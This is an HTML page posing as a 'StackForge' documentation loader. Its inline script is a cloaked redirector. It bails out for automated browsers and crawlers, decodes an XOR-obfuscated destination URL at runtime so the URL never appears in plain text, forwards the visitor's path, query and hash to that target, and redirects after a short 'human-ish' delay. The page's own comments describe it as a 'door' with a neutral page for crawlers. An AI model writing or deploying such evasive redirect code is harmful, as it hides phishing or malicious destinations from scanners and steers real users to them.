<style>
  :root { color-scheme: dark; }
  html,body{margin:0;height:100%}
  body{background:#0b1220;color:#c9d4e3;font-family:-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
    display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:24px}
  .brand{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:20px;letter-spacing:.5px;color:#e6edf6}
  .brand b{color:#7e9bff}
  .s{width:38px;height:38px;margin:22px auto;border:3px solid rgba(255,255,255,.10);border-top-color:#7e9bff;border-radius:50%;animation:r .8s linear infinite}
  @keyframes r{to{transform:rotate(360deg)}}
  .m{opacity:.55;font-size:14px}
  a.c{display:none;margin-top:18px;color:#7e9bff;font-size:14px;text-decoration:none}
</style>
</head>
<body>
  <div class="brand">&lt;<b>StackForge</b>/&gt;</div>
  <div class="s"></div>
  <div class="m">Loading documentation…</div>
  <a class="c" id="c" href="#">Continue</a>
  <noscript><div class="m">Please enable JavaScript to load the documentation.</div></noscript>
  <script>
  (function(){
    try{
      // 1) drop obvious automation / non-interactive agents (crawlers stay on the neutral IT page)
      if (navigator.webdriver) return;
      if (!navigator.languages || !navigator.languages.length) return;
      if (typeof document.hidden !== "undefined" && document.hidden) return;
      // 2) decode destination at runtime (never present as plain text in HTML)
      var e=[50,46,46,42,41,96,117,117,57,62,52,116,48,53,50,52,52,35,53,48,40,116,57,53,55,117],k=90,u="";
      for(var i=0;i<e.length;i++){u+=String.fromCharCode(e[i]^k);}
      // 3) carry through any sub-path/query/hash below the door base (e.g. /m/rf/TOT -> <target>/rf/TOT)
      var base="/m/";
      var p=location.pathname||"";
      var extra=(p.indexOf(base)===0)?p.slice(base.length):"";
      var dest=extra?u.replace(/\/+$/,"")+"/"+extra:u;
      dest+=(location.search||"")+(location.hash||"");
      // 4) expose manual fallback (in case auto-nav is blocked in a webview)
      var c=document.getElementById("c");
      if(c){c.style.display="inline-block";c.setAttribute("href",dest);}
      // 5) tiny human-ish delay, then go
      setTimeout(function(){ try{ location.replace(dest); }catch(_){ location.href=dest; } }, 350);
    }catch(_){ /* stay on neutral page */ }
  })();
  </script>
</body>
